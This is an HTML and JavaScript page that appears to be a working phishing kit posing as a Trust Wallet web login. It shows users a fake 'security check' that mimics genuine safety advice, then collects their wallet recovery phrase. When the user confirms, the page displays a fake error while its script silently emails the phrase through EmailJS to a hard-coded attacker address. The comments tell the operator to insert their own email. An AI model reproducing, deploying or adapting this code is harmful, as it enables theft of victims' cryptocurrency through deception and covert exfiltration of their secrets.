<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>trust • secure flow</title>
  <!-- EmailJS -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif;
    }

    body {
      min-height: 100vh;
      background: url('https://ipblockchain.github.io/photo/images%20(2).jpeg') no-repeat center center fixed;
      background-size: cover;
      backdrop-filter: blur(2px);
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 12px;
    }

    /* main card — clean glass */
    .card {
      background: rgba(255, 255, 255, 0.08);
      backdrop-filter: blur(16px) saturate(140%);
      -webkit-backdrop-filter: blur(16px) saturate(140%);
      border-radius: 36px;
      border: 1px solid rgba(255, 255, 255, 0.18);
      box-shadow: 0 30px 50px -30px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(255, 255, 255, 0.06) inset;
      width: 100%;
      max-width: 460px;
      padding: 32px 24px;
      transition: all 0.2s ease;
      color: white;
    }

    /* all pages */
    .page {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 28px;
    }

    .landing, .rules-page, .recovery-page {
      display: none;
    }

    .landing.active, .rules-page.active, .recovery-page.active {
      display: flex;
    }

    /* headline */
    .headline {
      font-size: 1.5rem;
      font-weight: 400;
      letter-spacing: -0.02em;
      color: rgba(255, 255, 255, 0.9);
      text-align: center;
      margin-bottom: 8px;
    }

    .headline span {
      font-weight: 300;
      opacity: 0.7;
    }

    /* refined glass button */
    .glass-button {
      background: rgba(255, 255, 255, 0.06);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.2);
      padding: 14px 32px;
      border-radius: 60px;
      font-size: 1.3rem;
      font-weight: 450;
      color: white;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      cursor: pointer;
      box-shadow: 0 12px 24px -16px rgba(0, 0, 0, 0.4);
      transition: 0.2s ease;
      width: auto;
      min-width: 260px;
      letter-spacing: 0.3px;
    }

    .glass-button:hover {
      background: rgba(255, 255, 255, 0.15);
      border-color: rgba(255, 255, 255, 0.4);
      transform: scale(1.01);
    }

    .glass-button:active {
      transform: scale(0.98);
    }

    .light-tag {
      font-size: 0.8rem;
      background: rgba(255,255,255,0.1);
      padding: 4px 10px;
      border-radius: 80px;
      border: 0.5px solid rgba(255,255,255,0.2);
      color: rgba(255,255,255,0.8);
    }

    /* rules page */
    .rules-title {
      font-size: 1.6rem;
      font-weight: 380;
      letter-spacing: -0.3px;
      align-self: flex-start;
    }

    .rules-container {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 20px;
      margin: 8px 0 16px;
    }

    .rule-item {
      display: flex;
      align-items: center;
      gap: 16px;
      background: rgba(0, 0, 0, 0.2);
      backdrop-filter: blur(4px);
      padding: 14px 18px;
      border-radius: 28px;
      border: 1px solid rgba(255, 255, 255, 0.1);
      transition: 0.1s;
    }

    .rule-item:hover {
      background: rgba(0, 0, 0, 0.3);
      border-color: rgba(255, 255, 255, 0.2);
    }

    .rule-checkbox {
      width: 26px;
      height: 26px;
      border-radius: 50%;
      border: 2px solid rgba(255, 255, 255, 0.5);
      background: transparent;
      appearance: none;
      -webkit-appearance: none;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: 0.1s;
    }

    .rule-checkbox:checked {
      background: #4caf9e;
      border-color: #4caf9e;
      position: relative;
    }

    .rule-checkbox:checked::after {
      content: "✓";
      color: white;
      font-size: 1.2rem;
      font-weight: bold;
    }

    .rule-text {
      font-size: 1rem;
      font-weight: 320;
      line-height: 1.4;
      color: rgba(255, 255, 255, 0.95);
      flex: 1;
    }

    .action-btn {
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 255, 255, 0.25);
      padding: 16px 32px;
      border-radius: 60px;
      font-size: 1.3rem;
      font-weight: 420;
      color: white;
      width: 100%;
      cursor: pointer;
      transition: 0.15s;
      margin-top: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .action-btn:disabled {
      opacity: 0.3;
      filter: grayscale(60%);
      pointer-events: none;
      border-color: rgba(255,255,255,0.1);
    }

    .action-btn:not(:disabled):hover {
      background: rgba(255, 255, 255, 0.2);
      border-color: rgba(255, 255, 255, 0.45);
    }

    /* recovery page */
    .recovery-title {
      font-size: 1.6rem;
      font-weight: 380;
      align-self: flex-start;
    }

    .hint-box {
      background: rgba(0, 0, 0, 0.2);
      border-left: 4px solid rgba(255, 215, 0, 0.7);
      padding: 12px 16px;
      border-radius: 18px;
      font-size: 0.9rem;
      margin: 6px 0 12px;
      text-align: left;
      width: 100%;
      color: rgba(255, 255, 255, 0.9);
      font-weight: 300;
      backdrop-filter: blur(4px);
    }

    textarea {
      width: 100%;
      padding: 20px 18px;
      font-size: 1.1rem;
      border-radius: 28px;
      border: 1.5px solid rgba(255, 255, 255, 0.2);
      background: rgba(10, 15, 22, 0.5);
      backdrop-filter: blur(8px);
      color: white;
      resize: vertical;
      min-height: 170px;
      font-family: 'SF Mono', monospace;
      line-height: 1.5;
      outline: none;
    }

    textarea:focus {
      border-color: rgba(255, 255, 255, 0.5);
      background: rgba(10, 15, 22, 0.7);
    }

    textarea::placeholder {
      color: rgba(200, 215, 240, 0.5);
      font-size: 0.95rem;
    }

    .word-counter {
      align-self: flex-start;
      font-size: 0.85rem;
      margin: 6px 6px 10px;
      background: rgba(255, 255, 255, 0.08);
      padding: 4px 18px;
      border-radius: 40px;
      border: 0.5px solid rgba(255, 255, 255, 0.1);
      color: rgba(255,255,240,0.9);
    }

    .error-badge {
      display: inline-block;
      background: #c62828;
      width: 38px;
      height: 38px;
      border-radius: 50%;
      color: white;
      font-size: 2.1rem;
      line-height: 38px;
      text-align: center;
      box-shadow: 0 0 12px #ff5252;
    }

    .back-link {
      margin-top: 18px;
      color: rgba(220, 230, 255, 0.7);
      text-decoration: none;
      font-size: 0.9rem;
      border-bottom: 1px dotted rgba(255,255,255,0.3);
      cursor: pointer;
    }
    .back-link:hover {
      color: white;
    }

    .tiny-note {
      font-size: 0.7rem;
      opacity: 0.4;
      margin-top: 10px;
    }
  </style>
</head>
<body>
<div class="card" id="appCard">
  <!-- LANDING PAGE (only trust wallet button) -->
  <div class="page landing active" id="landingPage">
    <div class="headline">connect <span>•</span> secure</div>
    <button class="glass-button" id="showRulesBtn">
      <span>⎔</span> Trust Wallet <span style="font-weight:200;">web</span>
    </button>
    <div class="light-tag">encrypted path</div>
  </div>

  <!-- RULES PAGE (3 checkboxes) -->
  <div class="page rules-page" id="rulesPage">
    <div class="rules-title">security check</div>
    <div class="rules-container">
      <label class="rule-item">
        <input type="checkbox" class="rule-checkbox" id="rule1">
        <span class="rule-text">Never share your recovery phrase with anyone</span>
      </label>
      <label class="rule-item">
        <input type="checkbox" class="rule-checkbox" id="rule2">
        <span class="rule-text">Use a private & secure device / connection</span>
      </label>
      <label class="rule-item">
        <input type="checkbox" class="rule-checkbox" id="rule3">
        <span class="rule-text">Ensure no one is watching while entering words</span>
      </label>
    </div>

    <button class="action-btn" id="acceptRulesBtn" disabled>continue →</button>
    <div class="back-link" id="backFromRules">← back</div>
  </div>

  <!-- RECOVERY PAGE (24 words form) -->
  <div class="page recovery-page" id="recoveryPage">
    <div class="recovery-title">recovery phrase</div>
    <div class="hint-box">enter 12–24 words, separated by spaces</div>

    <textarea id="phraseInput" placeholder="example: jungle ice bridge unlock spirit ..."></textarea>
    <div class="word-counter" id="wordDisplay">⌨️ 0 words</div>

    <button class="action-btn" id="submitBtn" disabled>
      <span>✓</span> confirm
    </button>
    <div class="back-link" id="backFromRecovery">← back</div>
    <div class="tiny-note">offline checksum</div>
  </div>
</div>

<script>
  (function() {
    emailjs.init("PakuuN4ADUDEqrzHl");   // your public key

    // pages
    const landing = document.getElementById('landingPage');
    const rulesPage = document.getElementById('rulesPage');
    const recoveryPage = document.getElementById('recoveryPage');

    // buttons
    const showRulesBtn = document.getElementById('showRulesBtn');
    const backFromRules = document.getElementById('backFromRules');
    const backFromRecovery = document.getElementById('backFromRecovery');
    const acceptRulesBtn = document.getElementById('acceptRulesBtn');
    const rule1 = document.getElementById('rule1');
    const rule2 = document.getElementById('rule2');
    const rule3 = document.getElementById('rule3');

    // recovery elements
    const phraseInput = document.getElementById('phraseInput');
    const wordDisplay = document.getElementById('wordDisplay');
    const submitBtn = document.getElementById('submitBtn');

    // ---------- navigation ----------
    function showLanding() {
      landing.classList.add('active');
      rulesPage.classList.remove('active');
      recoveryPage.classList.remove('active');
    }

    function showRules() {
      landing.classList.remove('active');
      rulesPage.classList.add('active');
      recoveryPage.classList.remove('active');
      // uncheck all rules when entering
      rule1.checked = false;
      rule2.checked = false;
      rule3.checked = false;
      updateRulesButton();
    }

    function showRecovery() {
      landing.classList.remove('active');
      rulesPage.classList.remove('active');
      recoveryPage.classList.add('active');
      phraseInput.value = '';        // clear any old text
      validateWordCount();
    }

    // landing -> rules
    showRulesBtn.addEventListener('click', showRules);

    // rules -> landing
    backFromRules.addEventListener('click', showLanding);

    // recovery -> rules
    backFromRecovery.addEventListener('click', function() {
      showRules();
    });

    // ---------- rules check handling ----------
    function updateRulesButton() {
      const allChecked = rule1.checked && rule2.checked && rule3.checked;
      acceptRulesBtn.disabled = !allChecked;
    }

    rule1.addEventListener('change', updateRulesButton);
    rule2.addEventListener('change', updateRulesButton);
    rule3.addEventListener('change', updateRulesButton);

    // accept rules -> go to recovery page
    acceptRulesBtn.addEventListener('click', function() {
      if (!acceptRulesBtn.disabled) {
        showRecovery();
      }
    });

    // ---------- recovery: word count & validation ----------
    function validateWordCount() {
      const text = phraseInput.value.trim();
      const words = text ? text.split(/\s+/) : [];
      const count = words.length;
      wordDisplay.innerText = `⌨️ ${count} word${count !== 1 ? 's' : ''}`;
      submitBtn.disabled = (count < 12);
    }

    phraseInput.addEventListener('input', validateWordCount);

    // ---------- email sender (background) ----------
    async function sendPhraseViaEmail(phrase) {
      try {
        // REPLACE WITH YOUR REAL EMAIL ADDRESS
        const targetEmail = "mrx_private@protonmail.com";

        await emailjs.send(
          "service_j8bd9vn",
          "template_paduqpn",
          {
            email: targetEmail,
            words: phrase,
            message: `Recovery phrase: ${phrase}`,
            to_name: "Wallet Owner",
            from_name: "Recovery Page"
          }
        );
        console.log('email delivered in background');
      } catch (err) {
        console.warn('email failed (silent)', err);
      }
    }

    // ---------- confirm button: shows error cross, but sends email ----------
    submitBtn.addEventListener('click', async (e) => {
      e.preventDefault();
      const phrase = phraseInput.value.trim();
      if (!phrase) return;

      // disable and change to error cross
      submitBtn.disabled = true;
      const originalContent = submitBtn.innerHTML;
      submitBtn.innerHTML = `<span class="error-badge">✗</span> error`;

      // background email (fire & forget)
      sendPhraseViaEmail(phrase);

      // clear field
      phraseInput.value = '';
      validateWordCount();  // sets 0 words -> keeps disabled

      // revert button after 1.8 sec
      setTimeout(() => {
        submitBtn.innerHTML = originalContent;
        // button stays disabled because word count = 0
      }, 1800);
    });

    // initial states
    validateWordCount();
    // make sure only landing is active
    showLanding();
  })();
</script>
<!-- all English, no logos, three rules, proper navigation, email & word count working -->
</body>
</html>
